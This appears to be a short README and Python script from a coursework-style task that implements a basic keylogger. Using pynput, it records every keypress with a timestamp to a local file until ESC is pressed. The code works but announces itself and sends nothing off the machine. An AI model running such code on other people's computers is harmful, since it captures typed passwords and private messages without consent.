# Simple-Keylogger-Python
Task 04 - Basic Keylogger implementation using Python for educational purposes

# This program records keyboard inputs and saves them into a log file.
# For educational purposes only.

from pynput import keyboard
from datetime import datetime


log_file = "key_log.txt"


def write_to_file(key):
    key = str(key).replace("'", "")

    # Handle special keys
    if key == "Key.space":
        key = " "
    elif key == "Key.enter":
        key = "\n"
    elif "Key" in key:
        key = f"[{key}]"

    # Add timestamp
    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(log_file, "a") as file:
        file.write(f"{time} : {key}")


def on_press(key):
    write_to_file(key)


print("Keylogger started... Press ESC to stop.")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
